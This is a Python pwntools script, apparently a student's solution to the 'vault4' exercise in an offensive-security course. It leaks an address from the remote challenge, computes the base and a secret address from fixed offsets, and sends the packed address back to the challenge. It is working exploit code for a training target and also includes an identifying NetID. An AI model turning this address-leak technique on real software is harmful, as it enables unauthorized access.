from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "vault4"
PORT = 1234
NETID = b"os2178"
LOCAL = False
if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

#vault offsets
fakeOffset = "0x4030"
secretOffset = "0x4038"


print(p.recvuntil(b"at: "))

#fake address
fakeAddress = p.recvuntil(b"\n").strip()
#print(fakeAddress)

#reverse for LSB
fakeAddress = fakeAddress[::-1]
#print(str(fakeAddress))

#Convert to hex
fakeAddress = "0x" + fakeAddress.hex()
#print(fakeAddress)

#find secret address
baseAddress = hex(int(fakeAddress, 16) - int(fakeOffset, 16))
secretAddress = hex(int(baseAddress, 16) + int(secretOffset, 16))

#convert to raw bytes
secretAddress = secretAddress[2:]
secretAddress = "0000" + secretAddress
secretAddress = bytes.fromhex(secretAddress)
secretAddress = secretAddress[::-1]

print(secretAddress)
print(p.recvuntil(b"> "))
p.sendline(secretAddress)

p.interactive()
